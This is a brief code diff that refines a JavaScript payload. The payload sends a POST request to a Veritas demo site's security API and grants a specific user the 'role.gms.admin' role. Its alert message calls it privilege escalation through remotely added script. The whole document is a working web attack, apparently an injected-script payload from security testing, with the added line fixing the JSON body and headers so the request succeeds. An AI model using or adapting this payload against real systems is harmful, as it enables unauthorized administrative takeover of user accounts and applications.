@@ -1,3 +1,1 @@
-var b = {data:[{type:`roles`,id:`role.gms.admin`}]};
-fetch('https://altademo.us.veritas.com/api/security/users/7a455160-fbe5-4320-bf05-61bb0e7ed411/relationships/roles',{method:'POST',body:b});
-alert('executed post fetch');
+fetch('https://altademo.us.veritas.com/api/security/users/7a455160-fbe5-4320-bf05-61bb0e7ed411/relationships/roles',{method:'POST',body:JSON.stringify({data:[{type:'roles',id:'role.gms.admin'}]}),headers:{'Content-type':'application/vnd.api+json; version=1.0'}});alert('executed priv esc post fetch via remote script add');
